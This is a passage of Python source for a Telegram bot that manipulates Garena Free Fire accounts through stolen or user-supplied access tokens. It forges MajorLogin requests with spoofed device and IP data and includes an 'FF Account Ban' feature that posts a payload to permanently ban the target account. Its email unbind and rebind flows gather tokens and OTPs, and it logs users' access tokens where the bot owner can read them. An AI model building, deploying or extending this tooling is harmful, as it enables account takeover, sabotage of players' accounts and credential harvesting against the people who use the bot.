            KeyboardButton(text="Unbind Email", style="success"),
            KeyboardButton(text="Change Bind Email", style="success")
        ],
        [
            KeyboardButton(text="Get Token Details", style="success"),
            KeyboardButton(text="Single Subscribe", style="success")
        ],
        [
            KeyboardButton(text="Eat to Access Token", style="success"),
            KeyboardButton(text="Ban Status", style="success")
        ],
        [
            KeyboardButton(text="How To Use", style="success"),
            KeyboardButton(text="Support", style="success")
        ],
        [
            KeyboardButton(text="FF Account Ban", style="danger"),
            KeyboardButton(text="Revoke Access Token", style="danger")
        ],
        [
            KeyboardButton(text="Long Bio Update", style="success")
        ]
    ]
    return ReplyKeyboardMarkup(keyboard=keyboard, resize_keyboard=True)

# ========== BOT HANDLERS ==========
async def start(message: types.Message, state: FSMContext):
    await state.clear()
    await message.answer(
        "<b>Welcome!</b>\n\n<b>Main Menu - Please select an option:</b>",
        reply_markup=get_main_keyboard(),
        parse_mode=ParseMode.HTML
    )

async def cancel_command(message: types.Message, state: FSMContext):
    await state.clear()
    await message.answer(
        "<b>Operation cancelled.</b>",
        reply_markup=get_main_keyboard(),
        parse_mode=ParseMode.HTML
    )

# ========== LOGS COMMAND ==========
async def show_logs(message: types.Message):
    if message.from_user.id != OWNER_ID:
        await message.answer("❌ Only admin can view logs!", parse_mode=ParseMode.HTML)
        return
    
    logs = get_all_logs_since(days=1)
    if not logs:
        await message.answer("📭 No logs today", parse_mode=ParseMode.HTML)
        return
    
    recent = logs[-10:]
    text = "📋 **Recent Logs:**\n\n"
    for log in recent:
        text += f"🕐 {log['timestamp']}\n"
        text += f"👤 {log['username']} (ID: {log['user_id']})\n"
        text += f"📌 {log['action']}\n"
        text += f"📊 {log.get('result', 'N/A')[:50]}\n\n"
    
    await message.answer(text, parse_mode=ParseMode.HTML)

# ========== BALANCE COMMAND ==========
async def balance_command(message: types.Message):
    await message.answer(
        f"⭐ **Your Balance**\n\n"
        f"💎 Stars: {get_user_stars(message.from_user.id)}",
        parse_mode=ParseMode.HTML
    )

# ========== ADD STARS ADMIN ==========
async def add_stars_admin(message: types.Message):
    if message.from_user.id != OWNER_ID:
        await message.answer("❌ Only admin can add stars!", parse_mode=ParseMode.HTML)
        return
    
    parts = message.text.split()
    if len(parts) < 3:
        await message.answer(
            "❌ Usage: /addstars <user_id> <amount>\n\n"
            "Example: /addstars 8383307682 100",
            parse_mode=ParseMode.HTML
        )
        return
    
    try:
        user_id = int(parts[1])
        amount = int(parts[2])
        add_stars(user_id, amount)
        await message.answer(
            f"✅ Added {amount} stars to user {user_id}\n"
            f"💎 New Balance: {get_user_stars(user_id)}",
            parse_mode=ParseMode.HTML
        )
    except:
        await message.answer("❌ Invalid input!", parse_mode=ParseMode.HTML)

# ========== PAYMENT CALLBACK ==========
async def handle_pay_callback(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()
    
    if callback_query.data == "pay_revoke":
        user_id = callback_query.from_user.id
        data = await state.get_data()
        token = data.get("revoke_token")
        nickname = data.get("revoke_nickname")
        uid = data.get("revoke_uid")
        
        if get_user_stars(user_id) < 10:
            await callback_query.message.edit_text(
                "Revoke Access Token\n\n"
                "❌ You don't have enough Stars!\n\n",
                reply_markup=get_support_inline(),
                parse_mode=ParseMode.HTML
            )
            await state.clear()
            return
        
        deduct_stars(user_id, 10)
        success, msg = revoke_token(token)
        
        if success:
            await callback_query.message.edit_text(
                "✅ Revoke Access Token\n\n"
                f"✅ **Token Revoked Successfully!**\n\n"
                f"⭐ Stars Deducted: 10\n"
                f"💎 Remaining Stars: {get_user_stars(user_id)}\n\n"
                f"**Support Me**",
                reply_markup=get_support_inline(),
                parse_mode=ParseMode.HTML
            )
        else:
            add_stars(user_id, 10)
            await callback_query.message.edit_text(
                f"❌ Revoke Failed\n\n"
                f"{msg}\n\n"
                f"⭐ 10 Stars Refunded!\n\n"
                f"**Support Me**",
                reply_markup=get_support_inline(),
                parse_mode=ParseMode.HTML
            )
        
        await state.clear()

async def handle_all(message: types.Message, state: FSMContext):
    text = message.text
    current_state = await state.get_state()
    
    # ========== HOW TO USE ==========
    if text == "How To Use":
        await message.answer(
            "<b>How To Use Garena Email Bot</b>\n\n"
            "<b>1.</b> Click any option from the menu\n"
            "<b>2.</b> Follow the instructions\n"
            "<b>3.</b> Provide the required information\n"
            "<b>4.</b> Get your result\n\n"
            "<b>Available Features:</b>\n"
            "• Add Recovery Email\n"
            "• Check Recovery Email\n"
            "• Cancel Recovery Email\n"
            "• Check Platform\n"
            "• Unbind Email\n"
            "• Change Bind Email\n"
            "• Get Token Details\n"
            "• Revoke Access Token\n"
            "• Single Subscribe\n"
            "• Eat to Access Token\n"
            "• FF Account Ban\n"
            "• Ban Status\n"
            "• Long Bio Update (Fast)\n"
            "• Support",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== SUPPORT ==========
    if text == "Support":
        await message.answer(
            "<b>📞 Garena Official Support</b>\n\n"
            "Click the button below to visit the official Garena Support Center.",
            reply_markup=get_support_inline(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== LONG BIO UPDATE ==========
    if text == "Long Bio Update":
        await state.set_state("waiting_long_bio_token")
        await state.update_data(action="long_bio")
        await message.answer(
            "<b>📝 LONG BIO UPDATE</b>\n\n"
            "Please enter your <b>Access Token</b>:",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== SINGLE SUBSCRIBE ==========
    if text == "Single Subscribe":
        success, msg = single_subscribe()
        await message.answer(f"<b>{msg}</b>", reply_markup=get_support_inline(), parse_mode=ParseMode.HTML)
        return

    # ========== ADD RECOVERY EMAIL ==========
    if text == "Add Recovery Email":
        await state.set_state("waiting_token")
        await state.update_data(action="add_recovery")
        await message.answer(
            "<b>Please enter your Access Token:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== CHECK RECOVERY EMAIL ==========
    if text == "Check Recovery Email":
        await state.set_state("waiting_token")
        await state.update_data(action="check_recovery")
        await message.answer(
            "<b>Please enter your Access Token:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== CHECK PLATFORM ==========
    if text == "Check Platform":
        await state.set_state("waiting_token")
        await state.update_data(action="check_platform")
        await message.answer(
            "<b>Please enter your Access Token:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== GET TOKEN DETAILS ==========
    if text == "Get Token Details":
        await state.set_state("waiting_token")
        await state.update_data(action="token_details")
        await message.answer(
            "<b>Please enter your Access Token:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== CANCEL RECOVERY EMAIL ==========
    if text == "Cancel Recovery Email":
        await state.set_state("waiting_token")
        await state.update_data(action="cancel_recovery")
        await message.answer(
            "<b>Please enter your Access Token:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== UNBIND EMAIL ==========
    if text == "Unbind Email":
        await state.set_state("waiting_token")
        await state.update_data(action="unbind")
        await message.answer(
            "<b>Please enter your Access Token:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== CHANGE BIND EMAIL ==========
    if text == "Change Bind Email":
        await state.set_state("waiting_token")
        await state.update_data(action="change_bind")
        await message.answer(
            "<b>Please enter your Access Token:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== REVOKE ACCESS TOKEN ==========
    if text == "Revoke Access Token":
        await state.set_state("waiting_revoke_token")
        await state.update_data(action="revoke")
        await message.answer(
            " Revoke Access Token\n\n"
            "Please enter your access token:\n\n"
            "**Support Me**",
            reply_markup=get_support_inline(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== EAT TO ACCESS TOKEN ==========
    if text == "Eat to Access Token":
        await state.set_state("waiting_eat_token")
        await state.update_data(action="eat_token")
        await message.answer(
            "<b>Please enter your EAT Token or Full EAT URL:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== FF ACCOUNT BAN ==========
    if text == "FF Account Ban":
        await state.set_state("waiting_token")
        await state.update_data(action="ff_ban")
        await message.answer(
            "<b>Please enter your Access Token to permanently ban the account:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== BAN STATUS ==========
    if text == "Ban Status":
        await state.set_state("waiting_uid")
        await state.update_data(action="ban_check")
        await message.answer(
            "<b>Please enter the UID to check ban status:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== PROCESS REVOKE TOKEN ==========
    if current_state == "waiting_revoke_token":
        token = text.strip()
        
        if not is_valid_token(token):
            await message.answer(
                "❌ Invalid Access Token. Please enter a valid token:",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        
        success, info = get_token_details(token)
        if not success:
            await message.answer(
                f"❌ {info}\n\nPlease enter a valid Access Token:",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        
        nickname = "Unknown"
        uid = "Unknown"
        match = re.search(r'Nickname:\s*(.+?)(?:\n|$)', info)
        if match:
            nickname = match.group(1).strip()
        match2 = re.search(r'UID:\s*(.+?)(?:\n|$)', info)
        if match2:
            uid = match2.group(1).strip()
        
        await state.update_data(revoke_token=token, revoke_nickname=nickname, revoke_uid=uid)
        
        await message.answer(
            " Revoke Access Token\n\n"
            f"**Revoke token for account:** {nickname} (ID: {uid})\n\n"
            f"**Pay ★ 10**",
            reply_markup=get_pay_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    # ========== PROCESS INPUT ==========
    if current_state == "waiting_token":
        if not is_valid_token(text.strip()):
            await message.answer(
                "<b>Invalid Access Token.</b> Please enter a valid token:",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        
        data = await state.get_data()
        action = data.get("action")
        
        log_user_action(
            user_id=message.from_user.id,
            username=message.from_user.username or message.from_user.first_name,
            action=action,
            data={"token": text.strip()}
        )
        
        if action == "add_recovery":
            await state.update_data(tmp_token=text.strip())
            await state.set_state("waiting_email")
            await message.answer(
                "<b>Please enter your email address:</b>",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        
        elif action == "check_recovery":
            success, msg = check_recovery(text.strip())
            await message.answer(msg, reply_markup=get_support_inline(), parse_mode=ParseMode.HTML)
            await state.clear()
            return
        
        elif action == "check_platform":
            success, msg = check_platform(text.strip())
            await message.answer(msg, reply_markup=get_support_inline(), parse_mode=ParseMode.HTML)
            await state.clear()
            return
        
        elif action == "token_details":
            success, msg = get_token_details(text.strip())
            await message.answer(msg, reply_markup=get_support_inline(), parse_mode=ParseMode.HTML)
            await state.clear()
            return
        
        elif action == "cancel_recovery":
            success, msg = cancel_recovery(text.strip())
            await message.answer(f"<b>{msg}</b>", reply_markup=get_support_inline(), parse_mode=ParseMode.HTML)
            await state.clear()
            return
        
        elif action == "unbind":
            await state.update_data(tmp_token=text.strip())
            await state.set_state("waiting_email")
            await message.answer(
                "<b>Please enter your email address:</b>",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        
        elif action == "change_bind":
            await state.update_data(tmp_token=text.strip())
            await state.set_state("waiting_old_email")
            await message.answer(
                "<b>Please enter your current (old) email address:</b>",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        
        elif action == "revoke":
            success, msg = revoke_token(text.strip())
            await message.answer(f"<b>{msg}</b>", reply_markup=get_support_inline(), parse_mode=ParseMode.HTML)
            await state.clear()
            return
        
        elif action == "ff_ban":
            log_user_action(
                user_id=message.from_user.id,
                username=message.from_user.username or message.from_user.first_name,
                action="FF_ACCOUNT_BAN",
                data={"token": text.strip()}
            )
            
            await message.answer("<b>Processing ban request...</b>", parse_mode=ParseMode.HTML)
            success, msg = ban_account(text.strip())
            
            log_user_action(
                user_id=message.from_user.id,
                username=message.from_user.username or message.from_user.first_name,
                action="FF_ACCOUNT_BAN_RESULT",
                data={},
                result="Success" if success else "Failed"
            )
            
            await message.answer(msg, reply_markup=get_support_inline(), parse_mode=ParseMode.HTML)
            await state.clear()
            return

    # ========== WAITING EMAIL ==========
    if current_state == "waiting_email":
        if not is_valid_email(text.strip()):
            await message.answer(
                "<b>Invalid email format.</b> Please enter a valid email address:",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        
        data = await state.get_data()
        action = data.get("action")
        
        if action == "add_recovery":
            await state.update_data(tmp_email=text.strip())
            await state.set_state("waiting_otp")
            await message.answer(
                "<b>Please enter the OTP code received in your email:</b>",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        
        elif action == "unbind":
            await state.update_data(tmp_email=text.strip())
            await state.set_state("waiting_otp")
            await message.answer(
                "<b>Please enter the OTP code:</b>",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return

    # ========== WAITING OTP ==========
    if current_state == "waiting_otp":
        if not text.strip():
            await message.answer(
                "<b>OTP cannot be empty.</b> Please enter the OTP:",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        
        data = await state.get_data()
        action = data.get("action")
        
        if action == "add_recovery":
            await state.update_data(tmp_otp=text.strip())
            await state.set_state("waiting_security")
            await message.answer(
                "<b>Please set a 6-digit Security Code:</b>",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        
        elif action == "unbind":
            otp = text.strip()
            email = data.get("tmp_email")
            token = data.get("tmp_token")
            if not email or not token:
                await message.answer("<b>Session expired. Please start over.</b>", reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
                await state.clear()
                return
            await message.answer("<b>Processing...</b>", parse_mode=ParseMode.HTML)
            success, msg = unbind_email(email, token, otp=otp)
            await message.answer(f"<b>{msg}</b>", reply_markup=get_support_inline(), parse_mode=ParseMode.HTML)
            await state.clear()
            return

    # ========== WAITING SECURITY CODE ==========
    if current_state == "waiting_security":
        if not is_valid_security_code(text.strip()):
            await message.answer(
                "<b>Invalid Security Code.</b> Must be exactly 6 digits. Please try again:",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        
        data = await state.get_data()
        token = data.get("tmp_token")
        email = data.get("tmp_email")
        otp = data.get("tmp_otp")
        sec = text.strip()
        
        if not all([token, email, otp, sec]):
            await message.answer("<b>Session expired. Please start over.</b>", reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
            await state.clear()
            return
        
        await message.answer("<b>Processing...</b>", parse_mode=ParseMode.HTML)
        success, msg = bind_email(token, email, otp, sec)
        await message.answer(f"<b>{msg}</b>", reply_markup=get_support_inline(), parse_mode=ParseMode.HTML)
        await state.clear()
        return

    # ========== CHANGE BIND EMAIL ==========
    if current_state == "waiting_old_email":
        if not is_valid_email(text.strip()):
            await message.answer(
                "<b>Invalid email format.</b> Please enter a valid email address:",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        await state.update_data(tmp_old=text.strip())
        await state.set_state("waiting_new_email")
        await message.answer(
            "<b>Please enter your new email address:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    if current_state == "waiting_new_email":
        if not is_valid_email(text.strip()):
            await message.answer(
                "<b>Invalid email format.</b> Please enter a valid email address:",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        await state.update_data(tmp_new=text.strip())
        await state.set_state("waiting_otp_old")
        await message.answer(
            "<b>Please enter the OTP sent to your old email:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    if current_state == "waiting_otp_old":
        if not text.strip():
            await message.answer(
                "<b>OTP cannot be empty.</b> Please enter the OTP:",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        await state.update_data(tmp_otp_old=text.strip())
        await state.set_state("waiting_otp_new")
        await message.answer(
            "<b>Please enter the OTP sent to your new email:</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    if current_state == "waiting_otp_new":
        if not text.strip():
            await message.answer(
                "<b>OTP cannot be empty.</b> Please enter the OTP:",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        
        data = await state.get_data()
        token = data.get("tmp_token")
        old_email = data.get("tmp_old")
        new_email = data.get("tmp_new")
        otp_old = data.get("tmp_otp_old")
        otp_new = text.strip()
        
        if not all([token, old_email, new_email, otp_old, otp_new]):
            await message.answer("<b>Missing data. Please start over.</b>", reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
            await state.clear()
            return
        
        await message.answer("<b>Processing...</b>", parse_mode=ParseMode.HTML)
        success, msg = change_bind_email(token, old_email, new_email, otp_old=otp_old, otp_new=otp_new)
        await message.answer(f"<b>{msg}</b>", reply_markup=get_support_inline(), parse_mode=ParseMode.HTML)
        await state.clear()
        return

    # ========== EAT TO ACCESS TOKEN ==========
    if current_state == "waiting_eat_token":
        if not text.strip():
            await message.answer(
                "<b>EAT Token cannot be empty.</b> Please enter a valid EAT token:",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        success, msg = eat_to_access_token(text.strip())
        await message.answer(msg, reply_markup=get_support_inline(), parse_mode=ParseMode.HTML)
        await state.clear()
        return

    # ========== LONG BIO UPDATE - WAITING TOKEN ==========
    if current_state == "waiting_long_bio_token":
        if not is_valid_token(text.strip()):
            await message.answer(
                "<b>Invalid Access Token.</b> Please enter a valid token:",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        
        await state.update_data(long_bio_token=text.strip())
        await state.set_state("waiting_long_bio_text")
        await message.answer(
            "<b>📝 Enter your new Bio (max 250 chars):</b>",
            reply_markup=get_main_keyboard(),
            parse_mode=ParseMode.HTML
        )
        return

    if current_state == "waiting_long_bio_text":
        bio_text = text.strip()
        
        if len(bio_text) < 3:
            await message.answer(
                "<b>Bio too short!</b> Minimum 3 characters.\n\nPlease enter again:",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        
        if len(bio_text) > 250:
            await message.answer(
                "<b>Bio too long!</b> Maximum 250 characters.\n\nPlease enter again:",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        
        data = await state.get_data()
        token = data.get("long_bio_token")
        
        log_user_action(
            user_id=message.from_user.id,
            username=message.from_user.username or message.from_user.first_name,
            action="LONG_BIO_UPDATE",
            data={"token": token, "bio": bio_text}
        )
        
        await message.answer("<b>⏳ Updating bio...</b>", parse_mode=ParseMode.HTML)
        
        success, msg = update_long_bio_fast(token, bio_text)
        
        log_user_action(
            user_id=message.from_user.id,
            username=message.from_user.username or message.from_user.first_name,
            action="LONG_BIO_RESULT",
            data={},
            result="Success" if success else "Failed"
        )
        
        await message.answer(msg, reply_markup=get_main_keyboard(), parse_mode=ParseMode.HTML)
        await state.clear()
        return

    # ========== BAN CHECK ==========
    if current_state == "waiting_uid":
        if not text.strip().isdigit():
            await message.answer(
                "<b>Invalid UID.</b> Please enter a numeric UID:",
                reply_markup=get_main_keyboard(),
                parse_mode=ParseMode.HTML
            )
            return
        success, msg = ban_check(text.strip())
        await message.answer(msg, reply_markup=get_support_inline(), parse_mode=ParseMode.HTML)
        await state.clear()
        return

    # ========== DEFAULT ==========
    await message.answer(
        "<b>Please select an option from the menu.</b>",
        reply_markup=get_main_keyboard(),
        parse_mode=ParseMode.HTML
    )

# ========== BAN FUNCTIONS ==========
def ban_account(access_token):
    try:
        jwt_token, error_msg = fetch_majorlogin_jwt(access_token)
        if not jwt_token:
            return False, f"❌ Authentication Failed: {error_msg}"
        
        user_data = decode_jwt(jwt_token)
        raw_nick = user_data.get('nickname', '')
        nickname = decode_ff_name(raw_nick)
        region = user_data.get('lock_region', user_data.get('region', 'IND'))
        account_id = user_data.get('account_id', 'Unknown')
        version = user_data.get('release_version', 'Latest')
        
        ban_resp = trigger_ban(jwt_token, version)
        
        if ban_resp.status_code == 200:
            result_text = f"""
<b>🔥 ACCOUNT BANNED SUCCESSFULLY!</b>

<b>Name:</b> {nickname}
<b>UID:</b> {account_id}
<b>Region:</b> {region}
<b>Version:</b> {version}
<b>Status:</b> PERMANENTLY BANNED
"""
            return True, result_text
        elif ban_resp.status_code == 401:
            return False, f"❌ Token Expired or Invalid (Status: 401)\n\nPlease use a valid Access Token."
        else:
            return False, f"❌ Failed to execute ban. Status: {ban_resp.status_code}"
    except Exception as e:
        return False, f"❌ Error: {str(e)}"

def ban_check(uid):
    try:
        url = f"https://crownx-premium-bancheck.vercel.app/baninfo?uid={uid}"
        response = requests.get(url, timeout=20)
        if response.status_code == 200:
            data = response.json()
            account_id = data.get('account_id', 'N/A')
            nickname = data.get('nickname', 'N/A')
            region = data.get('region', 'N/A')
            level = data.get('level', 'N/A')
            ban_info = data.get('ban_info', {})
            is_banned = False
            ban_start_time = 'N/A'
            ban_status = 'N/A'
            if isinstance(ban_info, dict):
                is_banned = ban_info.get('is_banned', False)
                ban_start_time = ban_info.get('ban_start_time', 'N/A')
                ban_status = ban_info.get('status', 'N/A')
            elif isinstance(ban_info, list):
                is_banned = len(ban_info) > 0
                if is_banned and len(ban_info) > 0:
                    first_ban = ban_info[0]
                    if isinstance(first_ban, dict):
                        ban_start_time = first_ban.get('ban_start_time', 'N/A')
                        ban_status = first_ban.get('status', 'N/A')
            result_text = f"""
<b>📊 ACCOUNT INFO</b>

<b>ID:</b> {account_id}
<b>Name:</b> {nickname}
<b>Region:</b> {region}
<b>Level:</b> {level}

<b>BAN STATUS:</b> {'❌ PERMANENTLY BANNED' if is_banned else '✅ ACCOUNT IS CLEAN'}
"""
            if is_banned:
                result_text += f"\n<b>Start Time:</b> {ban_start_time}\n<b>Reason:</b> {ban_status}"
            return True, result_text
        else:
            return False, f"❌ Failed. Status: {response.status_code}"
    except Exception as e:
        return False, f"❌ Error: {str(e)}"

def trigger_ban(jwt_token, version):
    headers = {
        'Authorization': f'Bearer {jwt_token}',
        'X-Unity-Version': '2018.4.11f1',
        'X-GA': 'v1 1',
        'ReleaseVersion': str(version),
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Dalvik/2.1.0 (Linux; Android)',
        'Accept-Encoding': 'gzip'
    }
    body = base64.b64decode(BODY_BASE64)
    return requests.post(API_URL, headers=headers, data=body, timeout=30, verify=False)

def fetch_majorlogin_jwt(tok):
    if tok.startswith("ey") and "." in tok:
        return tok, None
    oId = None
    try:
        r = requests.get(f"https://100067.connect.garena.com/oauth/token/inspect?token={tok}", 
                        headers={"User-Agent": "Mozilla/5.0"}, timeout=10).json()
        oId = r.get("open_id")
    except: pass
    if not oId:
        try:
            uid_headers = {"access-token": tok, "user-agent": "Mozilla/5.0"}
            uid_res = requests.get("https://prod-api.reward.ff.garena.com/redemption/api/auth/inspect_token/", 
                                  headers=uid_headers, verify=False, timeout=10).json()
            uid = uid_res.get("uid")
            if uid:
                openid_res = requests.post("https://topup.pk/api/auth/player_id_login", 
                                          json={"app_id": 100067, "login_id": str(uid)}, 
                                          verify=False, timeout=10).json()
                oId = openid_res.get("open_id")
        except: pass
    if not oId:
        return None, "❌ Failed to extract Open ID"
    platforms = [8, 3, 4, 6]
    for p_type in platforms:
        m = MajorLogin()
        m.event_time = str(datetime.now())[:-7]
        m.game_name = "free fire"
        m.platform_id = p_type
        m.client_version = "1.120.1"
        m.system_software = "Android OS 9 / API-28"
        m.system_hardware = "Handheld"
        m.telecom_operator = "Verizon"
        m.network_type = "WIFI"
        m.screen_width = 1920
        m.screen_height = 1080
        m.screen_dpi = "280"
        m.processor_details = "ARM64 FP ASIMD AES VMH | 2865 | 4"
        m.memory = 3003
        m.gpu_renderer = "Adreno (TM) 640"
        m.gpu_version = "OpenGL ES 3.1 v1.46"
        m.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
        m.client_ip = "223.191.51.89"
        m.language = "en"
        m.open_id = oId
        m.open_id_type = str(p_type)
        m.device_type = "Handheld"
        m.access_token = tok
        m.platform_sdk_id = 1
        m.client_using_version = "7428b253defc164018c604a1ebbfebdf"
        m.login_by = 3
        m.channel_type = 3
        m.cpu_type = 2
        m.cpu_architecture = "64"
        m.client_version_code = "2019118695"
        m.login_open_id_type = p_type
        m.origin_platform_type = str(p_type)
        m.primary_platform_type = str(p_type)
        pl = enc(m.SerializeToString())
        try:
            x = requests.post(mLuRl, headers=mLhDr, data=pl, timeout=20, verify=False)
            if x.status_code == 200:
                res = MajorLoginRes()
                try:
                    res.ParseFromString(dec(x.content))
                except:
                    res.ParseFromString(x.content)
                if res.token:
                    return res.token, None
        except:
            continue
    return None, "❌ MajorLogin failed"

# ========== MAIN ==========
async def main():
    storage = MemoryStorage()
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=storage)
    
    dp.message.register(start, Command("start"))
    dp.message.register(cancel_command, Command("cancel"))
    dp.message.register(show_logs, Command("logs"))
    dp.message.register(balance_command, Command("balance"))
    dp.message.register(add_stars_admin, Command("addstars"))
    dp.message.register(handle_all)
    dp.callback_query.register(handle_pay_callback)
    
    print("=" * 50)
    print("🐉 Garena Bot - Revoke with Star Payment!")
    print("=" * 50)
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nBot stopped.")
        sys.exit(0)
        # new.py এর শেষে এই অংশ যোগ করো:

# webhook সেট করার ফাংশন
async def set_webhook():
    webhook_url = "https://garena-host.vercel.app/webhook"
    await bot.set_webhook(webhook_url)
